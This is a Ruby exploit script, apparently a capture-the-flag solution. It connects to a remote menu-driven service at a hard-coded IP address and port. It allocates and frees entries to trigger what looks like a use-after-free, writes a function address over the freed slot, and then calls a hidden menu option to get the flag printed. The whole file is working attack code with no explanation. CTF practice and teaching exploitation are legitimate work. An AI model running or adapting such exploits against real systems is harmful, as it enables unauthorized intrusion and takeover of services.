#!/usr/bin/env ruby
require '~/Tools/pwnlib'

local = false#true
if local
	host, port = '127.0.0.1', 4444
else
	host, port = '104.155.227.252', 31337
end

def bring(index, type, name)
	@r.recv_until("Enter your choice:")	
	@r.send("#{index}\n")
	@r.send("#{type}\n")
	@r.send("#{name}\n")
	@r.recv_until("Menu Options:")
end

def delete(index)
	@r.recv_until("Enter your choice:")	
	@r.send("4\n")
	@r.recv_until("Which element do you want to delete?")
	@r.send("#{index}\n")
end

def secret()
	@r.recv_until("Enter your choice:")
	@r.send("4919\n")
	puts @r.recv(65535)
end

def p64(*addr)
	return addr.pack("Q*")
end
def p32(*addr)
	return addr.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r=r
	
	flag = 0x40090d
	bring(2, 3, "a")
	bring(3, 2, "a")
	delete(1)
	bring(2, 3, p64(flag))
	secret()
end
